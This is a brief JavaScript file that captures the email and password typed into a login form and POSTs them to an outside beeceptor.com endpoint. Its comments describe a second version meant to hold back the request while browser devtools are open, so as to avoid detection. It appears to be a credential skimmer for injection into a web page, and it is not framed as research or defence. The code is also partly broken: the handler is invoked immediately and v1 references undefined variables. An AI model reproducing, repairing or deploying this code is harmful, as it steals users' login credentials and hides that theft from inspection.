const submitCreds = next => {
  console.log("in submit creds");
  const email = document.getElementById("email").value;
  console.log(document.getElementById("email").value);
  const password = document.getElementById("pwd").value;
  console.log(email, password);
  const data = {
    email: email,
    password: password
  };
  console.log(data);
  console.log("submit things");
  fetch("https://asdfasdfasdfasdf.free.beeceptor.com/creds", {
    method: "POST",
    mode: "cors",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email: email, password: password })
  }).then(res => {
    next();
  });
};

// v0 always sends. doesn't do anything other than post creds
function v0() {
  const form = document.getElementById("frm");
  form.onsubmit = submitCreds(form.onsubmit || function() {});
}
//v1 will not make the request if devtools open

function v1() {
  var devtools = function() {};
  devtools.toString = function() {
    this.opened = true;
  };
  console.log("%c", devtools);
  emailInput.addEventListener("input", updateEmail);
  form.onsubmit = submitCreds(form.onsubmit || function() {});
}
window.onload = function() {
  v0();
};
